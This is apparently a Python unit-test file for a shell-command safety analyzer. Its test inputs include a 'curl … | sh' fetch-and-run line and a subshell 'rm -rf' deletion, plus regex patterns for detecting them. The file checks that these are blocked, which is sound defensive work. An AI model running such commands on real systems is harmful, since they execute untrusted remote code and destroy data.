import unittest

from hamster.policy import CommandASTAnalyzer


class TestCommandASTAnalyzer(unittest.TestCase):
    def test_empty_command(self):
        res = CommandASTAnalyzer.analyze("")
        self.assertFalse(res["safe"])
        self.assertIn("empty_command", res["violations"])

    def test_simple_safe_command(self):
        res = CommandASTAnalyzer.analyze("echo hello")
        self.assertTrue(res["safe"])

    def test_sudo_blocked(self):
        res = CommandASTAnalyzer.analyze("sudo apt-get update")
        self.assertFalse(res["safe"])
        self.assertTrue(len(res["violations"]) >= 1)

    def test_pipe_to_sh_suspect(self):
        res = CommandASTAnalyzer.analyze("curl http://example/x.sh | sh")
        self.assertFalse(res["safe"])
        self.assertIn(
            "(curl|wget|fetch)[^|]*\\|\\s*(sh|bash|zsh|python|python3)\\b",
            " ".join(res.get("suspects", [])),
        )

    def test_subshell_suspect(self):
        res = CommandASTAnalyzer.analyze("echo $(rm -rf /tmp/test)")
        self.assertFalse(res["safe"])
        self.assertIn("\\$\\(|`", " ".join(res.get("suspects", [])))


if __name__ == "__main__":
    unittest.main()
